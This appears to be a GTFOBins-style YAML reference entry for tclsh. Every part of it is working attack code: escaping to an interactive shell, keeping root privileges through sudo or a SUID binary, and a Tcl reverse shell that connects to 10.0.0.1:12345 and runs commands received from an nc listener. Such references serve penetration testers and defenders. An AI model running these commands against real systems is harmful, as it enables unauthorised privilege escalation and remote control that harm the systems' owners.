---
functions:
  exec-interactive:
    - code: |
        tclsh
        exec /bin/sh <@stdin >@stdout 2>@stderr
  sudo-enabled:
    - code: |
        sudo tclsh
        exec /bin/sh <@stdin >@stdout 2>@stderr
  suid-enabled:
    - code: |
        ./tclsh
        exec /bin/sh -p <@stdin >@stdout 2>@stderr
  reverse-shell-non-interactive:
    - description: Run `nc -l -p 12345` to receive the shell on the other end.
      code: | 
        export RHOST=10.0.0.1
        export RPORT=12345 
        echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
---